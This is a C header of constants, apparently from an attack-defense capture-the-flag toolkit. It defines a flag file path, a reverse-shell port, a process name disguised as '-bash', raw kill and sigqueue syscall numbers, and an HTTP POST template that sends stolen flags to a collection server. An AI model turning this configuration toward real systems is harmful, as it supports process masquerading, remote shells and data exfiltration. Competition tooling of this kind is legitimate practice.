#define PWN_NAME      "/home/ctf/pwn"

#define FLAG_FILE_PATH "/flag"

#define SERVER_IP_ADDRESS "192.168.137.50"
#define SERVER_PORT 8000
#define REV_SHELL_PORT 1124

#define CHANGE_NAME "-bash"

#define INTERVAL 1000*10
#define PROC_NUM 20

#ifdef SUBMIT
#define HTTP_HEADER "POST /submit HTTP/1.1\r\n\
Host: 192.168.137.50:8000\r\n\
User-Agent: curl/7.55.1\r\n\
Accept: */*\r\nContent-Length: %d\r\n\
Content-Type: application/x-www-form-urlencoded\r\n\r\n%s"
#define HTTP_BODY "token=xxxx&&flag=%s"
#endif

#ifdef __x86_64
#define _NR_sigqueue  129
#define _NR_readlink  89
#define _NR_chdir     80
#define _NR_kill      62
#define _NR_open      2
#define _NR_getdents  78
#define _NR_lseek     8
#define LIBC_PATH	  "/lib/x86_64-linux-gnu/libc.so.6"
#else
#define _NR_sigqueue  178
#define _NR_readlink  85
#define _NR_chdir     12
#define _NR_kill      37
#define _NR_open      5
#define _NR_getdents  141
#define _NR_lseek     19
//#define LIBC_PATH     "/lib/i386-linux-gnu/libc.so.6"
#define LIBC_PATH     "/lib32/libc.so.6"
#endif

#define MAX_PATH_LEN  300
#define PATH          "/proc"

#define BUF_SIZE 1024*32

#define MAX_EVENTS 1024 /* Maximum number of events to process*/
#define LEN_NAME   16 /* Assuming that the length of the filename won't exceed 16 bytes*/
#define EVENT_SIZE (sizeof(struct inotify_event)) /*size of one event*/
#define BUF_LEN (MAX_EVENTS * (EVENT_SIZE + LEN_NAME))
